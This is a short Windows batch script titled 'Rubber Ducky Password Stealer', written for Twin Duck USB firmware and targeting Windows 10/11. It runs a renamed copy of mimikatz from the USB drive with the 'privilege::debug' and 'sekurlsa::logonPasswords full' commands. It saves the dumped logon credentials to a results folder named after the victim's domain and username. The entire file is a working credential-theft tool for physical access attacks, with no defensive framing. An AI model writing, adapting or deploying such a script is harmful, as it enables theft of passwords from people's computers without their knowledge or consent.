REM ######################################################
REM # Title: Rubber Ducky Password Stealer               #
REM # Description: CMD script for the Twin Duck firmware #
REM # Target: Windows 10/11 x32/x64                      #
REM # Author: Krouwndouwn                                #
REM ######################################################

REM ----- Variables -----
set mimikatz_files=%~d0\files\mimikatz
set results_folder=%~d0\results\%USERDOMAIN%@%USERNAME%

REM ----- Save mimikatz results -----
if exist %mimikatz_files%\Win32\mimikatz.rdps %mimikatz_files%\Win32\mimikatz.rdps "privilege::debug" "sekurlsa::logonPasswords full" exit > %results_folder%\mimikatz.txt
if exist %mimikatz_files%\x64\mimikatz.rdps %mimikatz_files%\x64\mimikatz.rdps "privilege::debug" "sekurlsa::logonPasswords full" exit > %results_folder%\mimikatz_x64.txt